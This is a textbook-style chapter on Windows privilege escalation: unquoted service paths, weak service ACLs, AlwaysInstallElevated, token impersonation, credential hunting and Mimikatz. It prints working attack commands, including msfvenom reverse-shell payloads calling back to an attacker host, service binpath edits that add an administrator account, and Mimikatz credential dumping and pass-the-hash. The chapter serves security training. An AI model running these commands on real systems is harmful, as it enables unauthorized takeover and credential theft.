# Chapter 31: Windows Privilege Escalation — From User to SYSTEM

*Windows privilege escalation has a unique flavor compared to Linux. Unquoted service paths, weak ACLs on service binaries, AlwaysInstallElevated, token impersonation — all can turn a low-privilege user into SYSTEM.*

---

## Windows Security Model Basics

```
SYSTEM                  ← Highest OS privilege
  ↑
Administrator           ← High integrity, UAC applies
  ↑
Standard User           ← Medium integrity, limited access
  ↑
Low Integrity (sandbox) ← Browser, AppContainer
```

**Access Tokens:** Every process has a token defining its privileges. Stealing or impersonating a higher-privilege token = privilege escalation.

**Integrity Levels:** Each object has an integrity label. Low integrity processes can't write to medium/high integrity objects.

---

## Enumeration

```powershell
# Who am I?
whoami
whoami /all          # full token info, privileges
whoami /priv         # privileges

# System info
systeminfo           # OS version, hotfixes
Get-HotFix | Sort-Object InstalledOn | Select-Object -Last 10  # recent patches

# Search for missing patches
# Cross reference with CVE databases

# Installed software
wmic product get name,version
Get-WmiObject -Class Win32_Product | Select-Object Name,Version

# Running services
Get-Service | Where-Object {$_.Status -eq 'Running'}
wmic service list brief

# Scheduled tasks
schtasks /query /fo LIST /v | findstr /i "task name\|run as user\|task to run"
Get-ScheduledTask | Where-Object {$_.Principal.UserId -ne ""}

# Network info
ipconfig /all
netstat -ano          # connections with PIDs
netstat -ano | findstr LISTENING

# Users and groups
net user
net localgroup administrators
net accounts
```

---

## Unquoted Service Path

One of the most common Windows privesc:

```
Vulnerable service path:
BINARY PATH: C:\Program Files\Vuln App\service.exe

Windows searches:
1. C:\Program.exe
2. C:\Program Files\Vuln.exe
3. C:\Program Files\Vuln App\service.exe (actual binary)

If you can write to C:\Program Files\, create:
C:\Program.exe  ← your malicious binary!

When service starts → executes your binary as SYSTEM!
```

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | \
    findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell version
Get-CimInstance -ClassName win32_service | 
    Select-Object Name, State, PathName | 
    Where-Object {$_.PathName -notlike '"*' -and $_.PathName -notlike 'c:\windows*'} |
    Format-List
```

### Exploiting Unquoted Path

```bash
# Find which directory in the path you can write to
icacls "C:\Program Files\Vuln App"

# If writable, create malicious binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o Vuln.exe
# Place it at C:\Program Files\Vuln.exe

# Restart the service (if you have permissions)
sc stop VulnService
sc start VulnService
# Or wait for scheduled reboot
```

---

## Weak Service ACLs

```powershell
# Check if you can modify a service's binary path
# Using accesschk (Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula

# If you have "SERVICE_CHANGE_CONFIG" on a service:
sc config VulnService binpath= "cmd.exe /c whoami > C:\whoami.txt"
sc start VulnService

# Or add yourself to admins:
sc config VulnService binpath= "net localgroup administrators hacker /add"
```

---

## AlwaysInstallElevated

If this registry key is set, any MSI installer runs as SYSTEM:

```powershell
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Both must be 1 to be vulnerable

# Exploit: create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f msi -o malicious.msi
msiexec /quiet /qn /i malicious.msi  # runs as SYSTEM!
```

---

## Token Impersonation

Windows tokens can sometimes be impersonated from lower privilege levels.

```powershell
# Check your privileges
whoami /priv

# Key privileges:
# SeImpersonatePrivilege    ← Can impersonate tokens (most service accounts have this)
# SeAssignPrimaryToken      ← Can assign primary token
# SeDebug                   ← Can debug any process (steal tokens)
# SeBackup/SeRestore        ← Can read/write any file
# SeTcbPrivilege            ← Act as OS (very powerful)
```

### JuicyPotato / PrintSpoofer (SeImpersonatePrivilege)

If you have `SeImpersonatePrivilege` (common on IIS, SQL Server, service accounts):

```bash
# PrintSpoofer — modern, works on newer Windows
PrintSpoofer64.exe -i -c cmd   # interactive SYSTEM shell

# JuicyPotato — older Windows
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# RoguePotato — network service → SYSTEM
```

---

## Credential Hunting

```powershell
# Saved credentials
cmdkey /list            # stored Windows credentials
dir C:\Users\ /s /b | findstr "passw\|cred\|vnc\|config"

# Registry credentials
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# VNC password
reg query HKCU\Software\ORL\WinVNC3 /v Password

# Windows autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# Look for AutoAdminLogon, DefaultUsername, DefaultPassword

# Configuration files
dir C:\ /s /b 2>nul | findstr /si "password" | findstr /v /si ".exe"
findstr /si "password" C:\*.xml C:\*.ini C:\*.txt C:\*.config

# DPAPI — decrypt Windows-stored credentials
# Mimikatz: dpapi::cred
```

---

## Automated Enumeration Tools

```powershell
# WinPEAS — comprehensive Windows enumeration
.\winPEASany.exe

# PowerUp — focused on misconfigurations
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt — security posture assessment
.\Seatbelt.exe all

# SharpUp — compiled C#
.\SharpUp.exe audit
```

---

## Mimikatz — Credential Extraction

```
Mimikatz dumps credentials from Windows memory (LSASS process).
Requires SYSTEM or debug privileges.
```

```cmd
# Run as admin/SYSTEM
mimikatz.exe

# Dump all credentials
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Dump SAM (local accounts)
mimikatz # lsadump::sam

# Pass the Hash
mimikatz # sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd.exe

# Golden ticket (Kerberos attack — see Chapter 36)
```

---

## Summary

| Technique | Check | Exploit |
|-----------|-------|---------|
| Unquoted service path | `wmic service get pathname` | Place exe at unquoted location |
| Weak service ACL | `accesschk.exe` | Modify binpath |
| AlwaysInstallElevated | Registry keys | Malicious MSI |
| SeImpersonatePrivilege | `whoami /priv` | PrintSpoofer / JuicyPotato |
| Saved credentials | `cmdkey /list`, registry | Reuse or decrypt |
| Weak file permissions | `icacls` | Overwrite service binary |

---

## Exercises

1. Set up a Windows VM with deliberate vulnerabilities (e.g., HackTheBox Windows boxes, or Windows PrivEsc room on TryHackMe)
2. Find and exploit an unquoted service path
3. Use WinPEAS and identify the top 3 findings — which would you prioritize?
4. Understand AlwaysInstallElevated — what group policy misconfiguration causes it?
